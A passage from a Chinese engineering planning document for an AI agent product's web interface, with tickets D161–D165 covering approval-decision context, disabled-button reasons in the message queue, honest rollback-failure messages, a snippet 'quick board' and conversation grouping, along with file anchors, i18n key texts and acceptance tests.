     `decisionWhyNowApproval` = 「Agent 已停在这一步，不批准就无法继续。」；
     `decisionWhyYouHighRisk` = 「这是一次高危操作，系统不代你决定。」；
     `decisionAfterApprove` = 「批准后：立即执行该工具，本条决定会记入本轮历史。」；
     `decisionAfterApproveWithRule` = 「批准后：立即执行该工具，并按所选范围生成放行规则（可在「已保存的放行规则」里撤销）。」；
     `decisionAfterReject` = 「拒绝后：该工具不执行，Agent 会收到拒绝结果并另行处置。」。
   - **§30 两套撤销语义（硬约束，写进实现注释）**：`decisionReversibleYes` 说的"可回到本次执行之前"属**代码 rollback**
     （checkpoint，`agent_loop_v2.py:759 rollback.kind='checkpoint'`）；`chat.turnChanges.revert` 说的"恢复到本轮之前"属
     **会话 revert**（撤销一次回答及其副作用）。两键**不得共用同一 label、同一按钮、同一图标**，
     且 `decisionReversibleUnknown` 不得被写成"可撤销"或"不可撤销"。
   - 空态与状态四档（竞品有 `emptyTitle`/`blocking/requested/waitingForMe/overdue`）：**本票不做** ——
     现读我方 `attentionWaiting`/`attentionUnread` 已覆盖"等待你处理"这一维，另立四档状态词表会与
     守门 151 的状态词汇契约（`AGENT_TASK_STATUSES` 六档）撞族；如要做属**改对外状态契约**，另计一票并走 §24。
   - 跨端处置：载荷服务端 ⇒ 与 D159 同一"其余端是否各有审批弹窗"的现读结论；web 先落地，其余端 `单端(web) + 服务端` 标注。

6. **验收判据**
   - 正向：喂满四字段的请求 ⇒ 四行按序出现且文案与键一一对应。
   - 正向：`reversibility:'reversible'` 用例必须断言服务端出口被调用（不是前端从 `dangerLevel` 猜）。
   - **反向对照 1**：把任一字段的渲染条件从"有值才渲染"改成"总渲染（空值显示 '—'）"⇒
     用例必须红（票面验收①）。
   - **反向对照 2**：把 `decisionReversible*` 与 `chat.turnChanges.revert` 复用同一 i18n key ⇒
     由新增用例（逐键断言 `t()` 返回值互不相同）判红；这是 §30 那条"两套语义不得共用一个标签"的机器看守。
   - **反向对照 3（假绿灯自检）**：把 `AgentCheckpointManager` 出口改成恒返回"可用"⇒ `unknown` 用例必须红，
     否则证明这条判据只是把红写死在常量上。
   - `node scripts/check-i18n-keys.mjs --staged` + `node scripts/check-v3-62-conversation-mount.mjs`（锚点漂移，守门 57 同族）exit 0。

7. **依赖与顺序**：与 D158 同属审批面但**动作不同，不得互顶**（票面）；建议顺序 D158 → D161
   （因为 `decisionAfterApproveWithRule` 的文案要描述"生成规则后可在哪撤销"，需要 D158 的面板名先定）。
   D159 可并行（改的是不同区块），但同文件 ⇒ 串行提交。
   `未取证: conversation-attention 是否已有"点击跳到待处理项"的既有实现` —— 第一命令
   `git grep -n "attentionWaiting" HEAD -- apps/web/src | grep -i "onClick\|navigate\|scroll"`（`:114-128` 现读只见徽标，未见跳转）。

8. **风险与回退** — **需 §24 拍板**（新增用户可见决策信息 + 竞品原文措辞）。
   **可直接批准的预填方案**：四字段一律由服务端填、缺项整行不渲染（即"最保守档"）；
   `reversibility` 三态表 = `reversible`（该会话当前存在可用 `checkpoint_id`，判据 `agent_loop_v2.py:758` 同条件）/
   `not-reversible`（工具被判定无 diff 或写库类不可回退 —— 由 `dangerLevel` + `CommandEffect` 现读推导，禁止人工登记表）/
   `unknown`（检查点管理器查询失败或超时）。
   爆炸半径小：纯信息展示，不改任何决策语义；开关 `IHUI_APPROVAL_DECISION_CONTEXT=0` 时服务端不填、前端整块不渲染。
   明确不做（防越权）：不新建状态四档词表、不给"审批等待中"引入新落库字段、不动 `conversation-attention` 既有键。

### D162 队列三个动作缺「为什么现在不能按」子类，且未区分"未发送"与"失败"

1. **目标行为**：队列条目上的每个动作按钮，灰着的时候鼠标移上去（或键盘聚焦）能说清**具体卡在哪一条**；
   而"没发出去"和"发出去失败了"是两个不同的词、两个不同的状态。

2. **现状锚点（全部现读）**
   - 同族键确证存在但**不在独立 `chatQueue` 命名空间**（票面"zh-CN 同族 12 条"这一读数不成立，见下）：
     `packages/i18n/messages/web/zh-CN.json` 实读到 `chat` 命名空间内 `:11263 "steer"` = 「立即引导(当前工具完成后生效)」、
     `:11264 "steerFailed"` = 「引导失败(队列已满或流已结束),请稍后重试」、`:11265-11268 "steerNoticeBar".{title,moreItems}`、
     `:10503 "queueUndoRestoredQueued"` = 「已恢复排队的消息」、`:10504 "queueUndoRestored"` = 「已恢复队列中的消息」；
     另一族在 `ai.*`：`:7390/7391 queuePrompt{,Desc}`、`:7426-7430` 内嵌 `queue.queueAhead` =
     「前面的消息尚未处理完成，正在按顺序等待」；`:23057 "queue"` = 「队列中还有 {count} 个请求」。
     ⇒ **推翻点**：现读跨 3 个层级（`chat.*` / `ai.….queue.*` / 各端 `steer*` 族），
     没有任何单一名叫 `chatQueue` 的 web 命名空间（命令 `git show HEAD:packages/i18n/messages/web/zh-CN.json | grep -n '"chatQueue"'` ⇒ 零命中）。
     派单前必须重跑 `git grep -cE '"(steer|queue)[A-Za-z]*":' HEAD -- packages/i18n/messages/web/zh-CN.json` 取现值，不得照"12 条"排工。
   - 终态混在一句里（本票核心缺口，实读到）：`chat.steerFailed` 一串同时承载"未发送"与"失败"，
     且把原因塞进括号（"队列已满或流已结束"）——正是票面要求拆开的两个终态。
   - UI 落点：`apps/web/src/components/chat/queue-item.tsx` **在索引中但不在 HEAD**
     （`git show HEAD:apps/web/src/components/chat/queue-item.tsx` ⇒ `fatal: path ... does not exist in 'HEAD'`），
     即此刻是他人/在飞新增文件 ⇒ **不得把它的内容当现状锚点**。已入库的相邻实现是
     `apps/web/src/components/chat/queue-interaction-bar.tsx`（+ `__tests__/queue-interaction-bar.test.tsx`，`git ls-files` 命中）。
   - 其余动作/键盘可达性/五种不可用态的渲染点：`未取证` ——
     取证命令 `git show :apps/web/src/components/chat/queue-item.tsx | grep -nE "disabled|Tooltip|title=|t\('"`（注意取**索引面** `:`，不是 HEAD）。
   - D38 五动词：票面记为已✅，本会话**未复验** ⇒ `未取证: D38 五动词现状（若需引用请跑 git grep -n "steer\|interrupt" HEAD -- apps/web/src/hooks/use-chat）`。

3. **改动分解**
   1. [止血] 新增拒因键族（**并入既有 `chat` 命名空间，不新建 `chatQueue` 顶层 ns** —— 新建会凭空多出第二处族，
      与 §19 parity 面重复）：每个动作各 6 条 `*Tip`，逐条对应一个具体条件（Runtime 能力 / 有无运行中 Turn /
      队列是否已变 / 是否控制命令 / 是否正在等待 Agent 应答 / 消息数已被并发变更）。
   2. [根治] 终态拆分：`chat.steerDeferred`（未发送，队列不变、内容保留）与改写后的 `chat.steerFailed`
      （真失败）两词并存；调用点必须**二选一**赋值，禁止一处同时用两词。
   3. [根治] 竞态分支：队列在"取数 → 展示"之间被并发变更时必须走 `queueChanged` 分支且**保留输入框内容**
      （落点 `apps/web/src/stores/chat.ts` 的队列读写处，现读 `git grep -n "chatQueue\|QueueItem" HEAD -- apps/web/src/stores/chat.ts` 已命中该文件）。
   4. [止血] 按钮可达性：disabled 按钮必须带 tooltip **且** 可键盘聚焦（竞品 `dragTip` 那条语义 = 聚焦后上下键调序）；
      不得只加 `aria-label` 就算过（票面验收③要求实测一次键盘路径）。
   5. [登记] 若 `queue-item.tsx` 尚未入库，本票步骤 1/2/4 的落点改到 `queue-interaction-bar.tsx` 或等其入库，
      派单人必须先判该文件归属（§12 污染纪律）。

4. **受影响文件**
   - `packages/i18n/messages/web/{zh-CN,zh-TW,ja,ko,en}.json`
   - `apps/web/src/components/chat/queue-interaction-bar.tsx`
   - `apps/web/src/components/chat/queue-item.tsx`（**索引面新文件，归属先判**）
   - `apps/web/src/stores/chat.ts`（并发变更分支 + 终态赋值）
   - `apps/web/src/hooks/use-chat/history-message.ts`（队列取数侧，现读命中 `QueueItem` 关键字）
   - `apps/web/src/components/chat/__tests__/queue-disabled-reasons.test.tsx` `[新]`

5. **跨端与 i18n**
   - web 新键（挂 `chat` ns，与既有 `steer`/`steerFailed` 同层）：
     `steerBoundaryNote` = 「在下一个安全执行边界交给 Agent，不停止当前执行」；
     `steerUnsupportedTip` = 「当前 Runtime 不支持插话，消息将继续排队」；
     `steerInactiveTip` = 「当前没有运行中的 Turn，消息将继续排队」；
     `steerWaitingTip` = 「先处理 Agent 正在等待的请求，再发送插话」；
     `steerControlCommandTip` = 「压缩上下文会在当前 Turn 完成后执行，不能插入正在运行的 Turn」；
     `steerQueueChangedTip` = 「排队消息已发生变化，请确认当前队列」；
     `steerDeferred` = 「未发送插话」；`steerFailedShort` = 「无法发送插话」；
     `interruptAndRun` = 「打断并执行」；`interruptAndRunUnsupportedTip` = 「当前 Runtime 不支持打断并执行」；
     `interruptAndRunInactiveTip` = 「当前没有运行中的 Turn，无需打断」；
     `interruptAndRunWaitingTip` = 「先处理 Agent 正在等待的请求，再打断并执行」；
     `interruptAndRunControlCommandTip` = 「这是控制命令，不能打断正在运行的 Turn」；
     `interruptAndRunQueueChangedTip` = 「排队消息已发生变化，请确认当前队列后再打断」；
     `interruptAndRunSourceMismatchTip` = 「这不是语音 Agent 委派的任务，将继续按普通任务处理」；
     `interruptAndRunDeferred` = 「未打断执行」；`interruptAndRunFailed` = 「无法打断执行」；
     `requeueTip` = 「重新排队」；`requeueInactiveTip` = 「当前会话已结束，无法重新排队」；
     `removeQueueTip` = 「移出队列」；`removeQueueLockedTip` = 「该消息正在被取出发送，暂不能移出」；
     `editQueueTip` = 「编辑排队内容」；`editQueueLockedTip` = 「该消息已进入执行边界，不能再编辑」；
     `queueDragTip` = 「拖动调整排队顺序；聚焦后可使用上下方向键」；
     `queueNotSent` = 「未发送」；`queueSendFailed` = 「发送失败」。
   - 规矩（票面）：**禁止**用一句"当前不可用"覆盖六格 ⇒ 实现上不得复用同一个 key 给多个 disabled 分支。
   - 跨端处置：`miniapp-taro` 有独立队列词表（实读 `packages/i18n/messages/miniapp-taro/zh-CN.json:825 "steer": {` 存在）
     ⇒ 同一批要给 miniapp 侧补同族拒因；`mobile-rn`（`:617-618 steerTitle/steerMore`）与 `extension`（`:207 steerNoticeTitle`）
     现读只有通知文案、无动作按钮族 ⇒ 标 `平台差异：仅 web/miniapp 有队列动作面`，其余端 `单端文档/不适用`。

6. **验收判据**
   - 正向：构造六种不可用态各一条用例，断言六条 tooltip 文案**两两互不相同**（同一串即判未落实）。
   - 正向：`deferred` 与 `failed` 必须出现在不同用例，且 `deferred` 用例额外断言输入框内容**仍在**（未丢草稿）。
   - **反向对照 1**：把 `steerQueueChangedTip` 改成与 `steerInactiveTip` 同串 ⇒ 用例必须红（互不相同那条判据有牙）。
   - **反向对照 2**：清空队列变更检测分支（模拟并发变更直接发）⇒ `deferred` 用例必须红。
   - **反向对照 3**：给 disabled 按钮只加 `aria-label` 不加 tooltip/键盘路径 ⇒ 键盘可达性用例必须红（票面验收③）。
   - 语言包：`node scripts/check-i18n-keys.mjs --staged`（parity/零死 key/同层重复键）+
     `node scripts/scan-i18n-zh-residue.mjs ko` / `zh-TW` 全绿。

7. **依赖与顺序**：票面"可立即独立派"成立，但开工第一命令是判 `queue-item.tsx` 归属与形态
   （`git status --porcelain -- apps/web/src/components/chat/queue-item.tsx` ⊕ 第 2 栏那条索引面 grep）；
   它在索引而不在 HEAD ⇒ 属他人/在飞文件，按 §12 不得代改，改落点为 `queue-interaction-bar.tsx`。
   与 D158/D159/D161 无耦合（不同屏不同动作面）。

8. **风险与回退** — 属"补齐既有动作的说明"，不改队列执行语义 ⇒ 偏修复；但**新增用户可见文案 +
   改变按钮可用态说明** ⇒ 仍 **需 §24 拍板**（票面 §24 触发条件里"改变对外可见行为"命中）。
   **可直接批准的预填方案**：`steerDeferred`/`steerFailedShort`/`queueNotSent`/`queueSendFailed` 四键照上表原文即终稿；
   六条 `*Tip` 逐条锁死到具体条件（Runtime 能力 / 无运行中 Turn / 队列已变 / 控制命令 / 等待 Agent 应答 / 已进入执行边界），
   **不接受**"合并成一条通用不可用文案"的简化；语音来源不符（`sourceMismatch`）一条我方当前无语音 Agent 委派 ⇒
   预填为**先登记键不接线**，并在键旁留 `// 平台差异：语音委派未实现`（不得造一个永不为真的分支冒充覆盖）。
   爆炸半径：纯展示 + store 的一个分支，最坏是文案与真实拒因错位；回退 = 撤掉新键引用、disabled 回落
   到既有用 `chat.steerFailed` 单串形态（保持可运行），代码回退用 `git revert`。

## 族 F2 交互（D163 D164 D165 D166）

> 取证口径：本文件所有 file:line 均由本轮现跑 `git grep -n … HEAD` / `Read` / `grep -n` 得到；
> 现读命令附在每条锚点后。**两处推翻票面**：① D165 票面路径 `apps/web/src/components/ai/sidebar-chat-history.tsx`
> 不存在，真身是 `apps/web/src/components/sidebar-chat-history.tsx`；② D166 票面键名 `linkFileActions.previewLoading`
> 在取证清单里零命中，真实族是 `chatSession.links.*`（另 `chatActivity.outputFiles.previewUnavailable.*` 是
> 五子类的现成范本）。D163 的"三态"表述需限定：`PreviewNoticeKind` 确是三档，但同族文案表自述是**四级**，
> 且准备态（`rollbackConfirmLoading`）**已有**，"补到五态"缺的是 expired / tooLarge 两态 + loading 文案。

---

### D163 回退与预览失败必须声明「工作区未发生变化」,并把 Diff 快捷预览从三态补到五态(承 V4 §8.3③;一手取证 2026-09-28)

1. **目标行为**：点"恢复检查点"失败时，屏幕明说"这次什么都没改成"；快捷预览读不出来时，除了说失败还给下一步动作；
   部分文件不在检查点里时提前警告，而不是恢复完才发现少了东西。

2. **现状锚点（含同义否证）**：我按这些同义词搜过 `undo / revert / rollback / restore / 撤销 / 回退 / 恢复 / 检查点 / checkpoint`。命中（说明**不是整族缺失**）：
   - `apps/web/src/components/ai/checkpoint-rollback-confirm.tsx`（207 行，现读 `wc -l`）——确认对话框已在；
   - `packages/i18n/messages/web/zh-CN.json:7252-7270` 的 `ai.checkpointHistory.rollbackConfirm*` 12 键，其中
     `rollbackConfirmLoading:"正在计算影响范围…"`＝竞品 `undoPreparingDescription` **等价物已存在**，
     `rollbackConfirmNoFiles:"无文件变更（仅恢复对话，共 {count} 条消息）"`＝"没改成东西"的最接近形态（但它属**确认前**，不是**失败后**）；
   - 预览降级机制在 `apps/web/src/components/media/use-preview-staleness.ts:28` `PreviewNoticeKind = 'cannot-read' | 'incomplete' | 'no-content' | null`
     ＝票面"三态"属实；文案在 `apps/web/src/components/media/preview-degradation-copy.ts:41-58`（该文件头注自述**四级**：badge / notice / incomplete / no-content，另加 `previewFileUpdated` 提示条），
     且 hook 已暴露 `refresh`（`use-preview-staleness.ts:244` `read('revalidate')`）——**"给动作"的机制在，缺的是那句动作文案**；
   - 为什么仍算缺（三条现读零命中）：`git grep -nE "工作区未发生|未发生变化|nothing changed" HEAD -- packages/i18n/messages apps/web/src packages/shared/src` → 0；
     `git grep -nE "任务记录|记录仍然保留|记录不会被删" HEAD -- packages/i18n/messages/web/zh-CN.json apps/web/src` → 0（竞品 `undoSucceededDescription` / `undoConfirmDescription` 都承诺"记录不删"，我方一句没有）；
     notice union 里没有 `expired` / `tooLarge`（上面 :28 逐字可见）。
   - **应撤的部分（如实登记，不硬凑）**：票面"缺准备态"应撤——`rollbackConfirmLoading` 就是它；票面"D90 已✅三态"需限定为
     "三档 notice，但文案表四档 + loading 标志位"。竞品原文行位：`docs/benchmark-evidence/2026-09/qoder/chat-stream-inventory.md:890-914`
     （undo 族）、`:893-898`（diffPreview 六键＝五态＋aria）。

3. **改动分解**：
   1. 【止血·文案】`preview-degradation-copy.ts` 的 `PreviewCopyKey` 加 4 个成员 `previewLoading` / `previewDiffFailed` / `previewDiffFailedAction` /
      `previewDiffExpired` / `previewDiffTooLarge`（内联兜底同时补齐，缺词不喷键名的既有机制不动）。
   2. 【止血·事实驱动的承诺】`checkpointHistory` 新增 `rollbackUnavailableDesc` / `rollbackFailedDesc` / `rollbackSucceededDesc` /
      `rollbackPartialWarning`；**禁止无条件说"未发生变化"**：恢复前抓一次受影响文件集的清单指纹（路径+大小+mtime 或内容 hash），
      失败回调里比对，比对相等才取 `…Desc`，不等取新增键 `rollbackDirtyDesc`（"工作区已部分改动，请手动检查"）。
   3. 【根治·状态机】`use-preview-staleness.ts` 的 `PreviewNoticeKind` 扩成 `'loading' | 'load-failed' | 'expired' | 'too-large' | 'cannot-read' | 'incomplete' | 'no-content'`；
      `expired` 触发＝diff 句柄被回收/缓存淘汰（存储侧返回 not-found 而非 error）；`too-large` 触发＝diff 字节或行数超阈值（阈值须是有依据的常量，写注释说明取自何处，不得凭空 1MB）；
      `load-failed` 触发＝取 diff 抛错/非 2xx（区别于 `cannot-read`＝当前文件读不到但已退快照）。
   4. 【根治·动作出口】`load-failed` 与 `expired` 两态必须挂 `refresh`/重挂 hover 的动作，不能只报失败。
   5. 【取证】开工前先跑 `Read apps/web/src/components/ai/checkpoint-history-panel.tsx` 与恢复 mutation 的调用点，确认失败分支现在落在哪个 toast（本轮**未取证**：恢复成功/失败的 toast 键位未逐条读到）。

4. **受影响文件**：
   - `apps/web/src/components/media/preview-degradation-copy.ts`
   - `apps/web/src/components/media/use-preview-staleness.ts`
   - `apps/web/src/components/media/preview-degradation-banner.tsx`
   - `apps/web/src/components/media/FilePreview.tsx`、`apps/web/src/components/media/UnifiedViewer.tsx`（消费 notice kind）
   - `apps/web/src/components/ai/checkpoint-rollback-confirm.tsx`、`apps/web/src/components/ai/checkpoint-history-panel.tsx`
   - `packages/i18n/messages/web/{zh-CN,zh-TW,en,ja,ko}.json`
   - `apps/web/src/components/media/__tests__/file-preview-degradation.test.tsx`（现有 D90 用例，扩到五态）
   - [新] `apps/web/src/components/ai/__tests__/d163-rollback-honesty.test.tsx`

5. **跨端与 i18n**（§19 五语言同批；键名逐字如下，zh 原文给出，其余四语走 `i18n-diff.mjs`→翻译→`i18n-apply.mjs`→`check-i18n-keys.mjs`）：
   - `a11y.previewLoading`＝`正在加载 Diff…`
   - `a11y.previewDiffFailed`＝`Diff 加载失败。`
   - `a11y.previewDiffFailedAction`＝`移开后重新悬停可重试。`
   - `a11y.previewDiffExpired`＝`这份 Diff 记录已过期，无法快捷预览。`
   - `a11y.previewDiffTooLarge`＝`Diff 过大，无法在快捷预览中显示。`
   - `ai.checkpointHistory.rollbackUnavailableTitle`＝`当前无法恢复`
   - `ai.checkpointHistory.rollbackUnavailableDesc`＝`文件检查点不可用，工作区未发生变化。`
   - `ai.checkpointHistory.rollbackFailedDesc`＝`文件检查点暂时不可用，工作区未发生变化。`
   - `ai.checkpointHistory.rollbackDirtyDesc`＝`工作区已发生部分改动，请手动检查后再重试。`
   - `ai.checkpointHistory.rollbackSucceededDesc`＝`已恢复 {count} 个文件；对话记录仍然保留。`
   - `ai.checkpointHistory.rollbackPartialWarning`＝`部分修改不在文件检查点中，恢复结果可能不完整。`
   - 跨端：`apps/web` 是主战场；`apps/miniapp-taro` / `apps/mobile-rn`+`packages/app` 的预览落点**本轮未取证是否有同族降级组件**——开工第一步先跑
     `git grep -ln "preview-degradation\|PreviewNoticeKind" HEAD -- apps/miniapp-taro apps/mobile-rn packages/app` 决定是"同步实现"还是写明"平台独占:小程序/RN 无悬停快捷预览这一交互面（无 hover），只需补 undo 侧的失败声明"。undo 声明文案三端共用同批键（`a11y.*` 是 web 侧 ns，RN/小程序各自的 ns 由该步实测确定，不得在端内硬编码中文）。

6. **验收判据**：
   - `node --test apps/web/src/components/media/__tests__/file-preview-degradation.test.tsx` → 五态各有用例且全绿；
   - `git grep -c "工作区未发生变化" HEAD -- packages/i18n/messages/web/zh-CN.json` → ≥2（Unavailable/Failed 两键）；
   - **反向对照 A（变异）**：把失败分支的比对结果硬编码成"相等"，`d163-rollback-honesty.test.tsx` 里"比对不等却说了未变化"那条断言必须翻红——证明承诺由事实驱动，不是安慰话；
   - **反向对照 B**：注入一次"部分文件恢复失败"，断言文案含具体文件数 **且** 不含"未发生变化"字样；把 `rollbackPartialWarning` 键删掉应导致用例红而非静默通过；
   - `node scripts/check-i18n-keys.mjs` 五语言 parity 绿、`scan-i18n-zh-residue.mjs ko/zh-TW` 零残留。

7. **依赖与顺序**：票面自陈依赖协议通道②/③（检查点可用性状态要能上报）——本轮**未取证**该依赖票的现号与状态，开工前跑 `node scripts/plan-tasks.mjs --open --dispatchable | grep -i "检查点\|checkpoint"` 复核；
   可独立派的部分＝第 1/2/3 步（纯前端态与文案）；`expired`/`tooLarge` 若需后端回码区分，则该两态等②/③。与 D165 无共享文件，可并行。

8. **风险与回退**：`PreviewNoticeKind` 是 union 扩集，消费点若用 exhaustive switch 会在 `tsc` 直接红（好事，不漏）；回退＝键加回 `| null` 之外的旧三档并删新文案键，无数据迁移。
   爆炸半径＝文件预览与检查点恢复两处 UI，**恢复是不可逆动作**，所以"未发生变化"这句宁可不说也不能说错（失效方向：比对拿不到 ⇒ 走 `rollbackDirtyDesc`/不承诺，绝不默认"未发生变化"）。
   **需 §24 拍板**：是（改变用户可见行为 + 新增对外承诺）。预填方案＝①失败/不可用时显示 `…未发生变化。`（仅当比对相等）；②比对不等显示"已部分改动，请手动检查"；
   ③成功显示"已恢复 N 个文件；对话记录仍然保留"；④快捷预览五态照第 5 栏五条文案；⑤阈值先取"diff 文本 > 200,000 字符 或 单文件行数 > 5,000 即 too-large"（依据：现读 `rollbackConfirmContentTruncated` 已存在"内容过长已截断"这一档，同一量级；落地时须在常量注释里写实际取自哪次实测）。

---

### D164 上下文投喂缺失:选中内容没有「速记板」暂存面(承 V4 §9.4①;一手取证 2026-09-28)

1. **目标行为**：我在某条回复里看到一段有用的东西，可以先"摘"下来放在一块板子上继续往下问，攒够了几段一起交给 Agent，而不是每次都当场贴进输入框。

2. **现状锚点（含同义否证）**：我按这些同义词搜过 `quickNote / 速记 / scratchpad / snippetBoard / contextBag / 引用选中 / addToContext / reference`。命中很多，**本票必须缩范围**：
   - "选中文本→交给对话"这一**动作**已存在且不止一处：`apps/web/src/components/chat/message-list/MessageItem.tsx:715`、`:1478`（D22 圈选 AI 回复入上下文，浮现「引用选中」按钮）；
     事件总线 `apps/web/src/components/chat/annotation-anchor.tsx:35` `ADD_TEXT_REFERENCE_EVENT = 'ihui:add-text-reference'`（DOCX 选区也复用它，见 `add-menu-popover.tsx:61`）；
   - 引用模型已含文本与 URL：`apps/web/src/hooks/use-message-references.ts:13` `export type ReferenceType = 'file' | 'url' | 'text' | 'image' | 'video'`，
     且有 `addTextReference` / `addCodeReference` / `removeReference`（`apps/web/src/components/chat/message-input.tsx:294`）——**逐条删除已存在**；
   - 上行已是**结构化字段**：`apps/web/src/hooks/use-message-send.ts:411`、`:480` `setPendingMessages((prev)=>[…,{text, refs: references.map(r=>({...r}))}])`——票面"不得再拍平进正文"这条**已满足**，应撤；
   - 为什么仍算缺（精确一格）：`use-message-send.ts:304 / 413 / 421 / 482` 四处 `resetReferences()`——引用在**发送即清空**，作用域是"这一条消息"，不是跨轮次的板；
     `git grep -niE "quickNote|速记|scratchpad|snippetBoard|contextBag" HEAD -- packages/i18n/messages apps/web/src packages/shared/src packages/app/src apps/miniapp-taro/src` → **0 命中**，
     即没有"板"这个容器，也就没有它的开关/标题/搜索/图片暂存/容量上限。竞品原文行位：`qoder/chat-stream-inventory.md:2007-2018`（selectionActions 11 键）与 `:2036-2045`（quickNotes 族，含 `description:"保存从 Agent 回复中摘出的片段。"`、`search`、`addImage`、`dropImages`）。

3. **改动分解**：
   1. 【根治·容器】新增 store `apps/web/src/stores/quick-board.ts`：条目 `{id, kind:'text'|'code'|'image', body, origin: {messageId?|terminal?|browser?}, addedAt}`，
      按 `userId + conversationId` 分桶持久（**不得**沿用 D20 `conversation-org.ts` 那种"只在本机 localStorage"当已交付——见 D165 第 8 栏同一条纪律）。
   2. 【止血·入口】`MessageItem.tsx` 的圈选浮条加一项「添加到速记板」，派发新事件 `ihui:add-quick-note`（复用 `annotation-anchor.tsx:35` 的事件族形态，不自造第二套派发）。
   3. 【根治·面板】`apps/web/src/components/chat/quick-board-panel.tsx` [新]：列条目 / 删条目 / 清空 / 搜索 / 「一次性加入输入区」。
      **内边距按 §4 复合面板档**（外层零 padding、行级自带 `px-3 py-*`），落点与 `unified-suggestion-panel.tsx` 同区，禁止起第三个浮层家族。
   4. 【止血·发送】发送时把"本次随附的板条目"并入既有 `refs`（不动 `resetReferences()` 对**输入区 chip** 的语义——板是独立生命周期，发送只清空"本次已取用"的条目，不整板清空）。
   5. 【补拒因】`addToQuickNoteFailed`（写存失败）与 `attachmentLimitReached`（上限）两态必须给原因与出口，与 D163/D165 的"失败给原因"同一条纪律。
   6. 终端选区与浏览器标注两类来源：本轮**未取证**其当前选区是否能拿到（`apps/web/src/components/ide/terminal-panel/TerminalViewport.tsx:241` 只有 Ctrl+Shift+C 复制）；浏览器标注那一侧受 D149（组件在库、生产面零挂载）阻塞。

4. **受影响文件**：
   - [新] `apps/web/src/stores/quick-board.ts`、`apps/web/src/components/chat/quick-board-panel.tsx`
   - `apps/web/src/components/chat/message-list/MessageItem.tsx`
   - `apps/web/src/components/chat/message-input.tsx`、`apps/web/src/hooks/use-message-references.ts`、`apps/web/src/hooks/use-message-send.ts`
   - `apps/web/src/components/chat/annotation-anchor.tsx`（事件族常量复用点）
   - `packages/i18n/messages/web/{zh-CN,zh-TW,en,ja,ko}.json`
   - [新] `apps/web/src/components/chat/__tests__/d164-quick-board.test.tsx`

5. **跨端与 i18n**（新命名空间 `chatQuickBoard`，顶层追加；同批五语言）：
   - `chatSelection.addToQuickBoard`＝`添加到速记板`；`chatSelection.addedToQuickBoard`＝`已添加到速记板`；
   - `chatSelection.addToQuickBoardFailed`＝`速记板保存失败，所选内容未暂存。`；`chatSelection.boardLimitReached`＝`速记板已达 {count} 条，请先移除一条再添加。`
   - `chatQuickBoard.title`＝`速记板`；`chatQuickBoard.description`＝`先摘存要用的片段，攒好了再一起交给 AI。`；`chatQuickBoard.open`＝`打开速记板`；`chatQuickBoard.close`＝`关闭速记板`；
   - `chatQuickBoard.search`＝`搜索速记板`；`chatQuickBoard.addPlaceholder`＝`记下点什么…`；`chatQuickBoard.remove`＝`移除`；`chatQuickBoard.clear`＝`清空速记板`；`chatQuickBoard.clearConfirm`＝`清空后 {count} 条片段将不可恢复，确认？`；
   - `chatQuickBoard.empty`＝`速记板是空的。选中回复里的内容即可摘存。`；`chatQuickBoard.sendFromBoard`＝`把 {count} 条片段加入本次提问`
   - 跨端：§9 默认全端。`packages/app`+`apps/mobile-rn` 有对话屏（同 `MessageItem` 语义）应同步做 store（store 放 `packages/shared/src/stores/` 用工厂 + 平台 transport，见 §3），面板各端自绘；
     `apps/miniapp-taro` 若因长按选区能力缺失无法摘存，写"平台独占:小程序选区事件不可编程读取"并在 PROJECT_PLAN 标注，不得静默只做 web。

6. **验收判据**：
   - `node --test apps/web/src/components/chat/__tests__/d164-quick-board.test.tsx` 覆盖：三类来源入板、删除/清空、上限拒收带原因、发送后板**不被整板清空**（反向对照：把 `clear-on-send` 写成整板清空，此断言必须红）；
   - 空板发送不产提示帧：断言 `refs.length===0` 时上行载荷里**没有** quickBoard 字段（正向对照：非空板才出现）；
   - 结构化上行：断言板条目落 `refs`（或 `quickBoardItems`）**数组**，正文不含被拍平的片段文本；把上行改成拼进 `text` 必须翻红；
   - `node scripts/check-i18n-keys.mjs` parity 绿 + `pnpm gen:i18n` 后守门 105（G1 源↔产物）全量 exit 0 + 守门 74 词表可解析。

7. **依赖与顺序**：与 D131（@ 引用缺维度）不重叠、不合票（票面已写，本轮复验：`mention-engine.ts` 的 `MENTION_DIMENSIONS` 是"检索来源"表，与"暂存片段"确是两套数据模型）——可独立派。
   被 D149（浏览器标注生产面零挂载）挡第 6 步的浏览器来源；与 D163/D165 无共享文件，可并行。附件字段设计若 D129 先落地则复用其字段命名，开工前跑 `node scripts/plan-tasks.mjs --open | grep -n "D129"`。

8. **风险与回退**：最大风险是"再造一层上下文输入通路"与既有引用 chips 双真相——正解是板**只负责暂存**，取用时**走既有 `refs` 通道**（不新增第二条上行链路）。
   回退＝面板与 store 整体下线（新文件 2 个 + 4 处调用点回滚），`resetReferences` 语义未动所以不影响既有引用行为。爆炸半径含跨端 store 工厂，务必别在端内各写一份持久化。
   **需 §24 拍板**：是（新增对外能力）。预填方案＝容量 20 条（对齐竞品 `attachmentLimitReached:"附件已达 20 个…"`）、条目正文单条上限沿用现读 `MAX_LABEL_LENGTH` 所在文件的既有截断策略（开工第一步读 `use-message-references.ts` 的截断实现并复用，不得新拍数字）、清空需二次确认、发送取用后条目**保留在板上并标"已用过"**（不自动消失）。

---

### D165 会话分组缺「移动到分组 / 移动所选 / 分组置顶」三个动作,且失败不给原因(承 V4 §9.4②;一手取证 2026-09-28)

1. **目标行为**：选中几条会话一次搬进某个分组；分组自己也能置顶；任何一步没成，屏幕告诉我"为什么没成、能不能重试"。

2. **现状锚点（含同义否证 + 票面勘误）**：我按这些同义词搜过 `分组 / 文件夹 / folder / tag / group / move / 移动 / 置顶 / pin / batch`。**票面路径是错的**：
   `apps/web/src/components/ai/sidebar-chat-history.tsx` **不存在**（`grep` 直接 No such file），真身 `apps/web/src/components/sidebar-chat-history.tsx`（1,179 行，`wc -l` 现读）。行号本身对得上，只是目录写歪：
   - 既有能力（本票射程外，**不得重做**）：按时间分组 `:136 groupByDate`；文件夹筛选 `:239-240 folderFilter`（`undefined` 全部 / `null` 未分组 / 字符串指定）；
     **会话级置顶已存在** `:326-333 pinMutation` → `setConversationPinned(id, pinned)`，成功文案 `:537` 用 `aiChat.toast.pinned/unpinned`（zh-CN.json:9039-9040）；
     批量已存在 `:398-428 batchMutation`，成功文案 `chatHistory.batch{Delete,Archive,Unarchive,Favorite,Unfavorite}Success`（`node -e require(...)` 现读 10 键齐）；
     搜索匹配面含文件夹名与标签名 `:181-182`；行内展示所属文件夹与标签 `:640-719`。
